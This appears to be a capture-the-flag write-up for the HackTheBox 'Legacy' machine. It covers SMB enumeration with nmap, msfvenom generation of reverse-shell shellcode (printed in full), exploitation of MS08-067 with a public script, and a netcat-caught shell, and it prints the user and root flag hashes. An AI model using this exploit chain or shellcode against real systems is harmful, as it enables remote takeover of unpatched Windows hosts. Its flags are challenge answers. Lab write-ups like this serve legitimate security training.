# Scan

```bash
ghost@localhost [21:45:46] [~/Documents/hacking/hackthebox/legacy] [master]
-> % rustscan -a $IP -- -sC -sV -oA .

Open 10.10.10.4:135
Open 10.10.10.4:139
Open 10.10.10.4:445

PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 53431/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50902/udp): CLEAN (Failed to receive data)
|   Check 4 (port 45011/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9ee9e (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   005056b9ee9e0000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
|_clock-skew: mean: 5d00h57m37s, deviation: 1h24m50s, median: 4d23h57m37s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-12-02T17:47:34+02:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
```


# 445

I use nmap script to check for SMB vulnerability.

```bash
ghost@localhost [22:17:13] [~/Documents/hacking/hackthebox/legacy] [master *]
-> % nmap --script smb-vuln\* -p 445 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-27 22:17 +08
Nmap scan report for 10.10.10.4
Host is up (0.47s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 11.49 seconds
```

### MS-08-067

I use the following script (https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py).

First I generate shellcode with msfvenom.

```bash
ghost@localhost [22:20:37] [~/Documents/hacking/hackthebox/legacy] [master *]
-> % msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1953 bytes
shellcode =  b""
shellcode += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x92\xed\xd6\xbe\x83\xee\xfc"
shellcode += b"\xe2\xf4\x6e\x05\x54\xbe\x92\xed\xb6\x37\x77"
shellcode += b"\xdc\x16\xda\x19\xbd\xe6\x35\xc0\xe1\x5d\xec"
shellcode += b"\x86\x66\xa4\x96\x9d\x5a\x9c\x98\xa3\x12\x7a"
shellcode += b"\x82\xf3\x91\xd4\x92\xb2\x2c\x19\xb3\x93\x2a"
shellcode += b"\x34\x4c\xc0\xba\x5d\xec\x82\x66\x9c\x82\x19"
shellcode += b"\xa1\xc7\xc6\x71\xa5\xd7\x6f\xc3\x66\x8f\x9e"
shellcode += b"\x93\x3e\x5d\xf7\x8a\x0e\xec\xf7\x19\xd9\x5d"
shellcode += b"\xbf\x44\xdc\x29\x12\x53\x22\xdb\xbf\x55\xd5"
shellcode += b"\x36\xcb\x64\xee\xab\x46\xa9\x90\xf2\xcb\x76"
shellcode += b"\xb5\x5d\xe6\xb6\xec\x05\xd8\x19\xe1\x9d\x35"
shellcode += b"\xca\xf1\xd7\x6d\x19\xe9\x5d\xbf\x42\x64\x92"
shellcode += b"\x9a\xb6\xb6\x8d\xdf\xcb\xb7\x87\x41\x72\xb2"
shellcode += b"\x89\xe4\x19\xff\x3d\x33\xcf\x85\xe5\x8c\x92"
shellcode += b"\xed\xbe\xc9\xe1\xdf\x89\xea\xfa\xa1\xa1\x98"
shellcode += b"\x95\x12\x03\x06\x02\xec\xd6\xbe\xbb\x29\x82"
shellcode += b"\xee\xfa\xc4\x56\xd5\x92\x12\x03\xee\xc2\xbd"
shellcode += b"\x86\xfe\xc2\xad\x86\xd6\x78\xe2\x09\x5e\x6d"
shellcode += b"\x38\x41\xd4\x97\x85\xdc\xb4\x9c\xe8\xbe\xbc"
shellcode += b"\x92\xfc\x8a\x37\x74\x87\xc6\xe8\xc5\x85\x4f"
shellcode += b"\x1b\xe6\x8c\x29\x6b\x17\x2d\xa2\xb2\x6d\xa3"
shellcode += b"\xde\xcb\x7e\x85\x26\x0b\x30\xbb\x29\x6b\xfa"
shellcode += b"\x8e\xbb\xda\x92\x64\x35\xe9\xc5\xba\xe7\x48"
shellcode += b"\xf8\xff\x8f\xe8\x70\x10\xb0\x79\xd6\xc9\xea"
shellcode += b"\xbf\x93\x60\x92\x9a\x82\x2b\xd6\xfa\xc6\xbd"
shellcode += b"\x80\xe8\xc4\xab\x80\xf0\xc4\xbb\x85\xe8\xfa"
shellcode += b"\x94\x1a\x81\x14\x12\x03\x37\x72\xa3\x80\xf8"
shellcode += b"\x6d\xdd\xbe\xb6\x15\xf0\xb6\x41\x47\x56\x36"
shellcode += b"\xa3\xb8\xe7\xbe\x18\x07\x50\x4b\x41\x47\xd1"
shellcode += b"\xd0\xc2\x98\x6d\x2d\x5e\xe7\xe8\x6d\xf9\x81"
shellcode += b"\x9f\xb9\xd4\x92\xbe\x29\x6b"
```

Since from nmap, I know it is Windows XP, I tried the option 6, while running netcat listener.

```bash
ghost@localhost [22:22:56] [~/Documents/hacking/hackthebox/legacy] [master *]
-> % python2 ms08-067.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################


$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

I got back reverse shell.

```bash
ghost@localhost [22:22:23] [~/Documents/hacking/hackthebox/legacy] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.4] 1032
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

Since it is already an admin user, nothing is left to be done.

```bash
C:\Documents and Settings>type john\Desktop\user.txt
e69af0e4f443de7e36876fda4ec7644f

C:\Documents and Settings>type Administrator\Desktop\root.txt
993442d258b0e0ec917cae9e695d5713
```
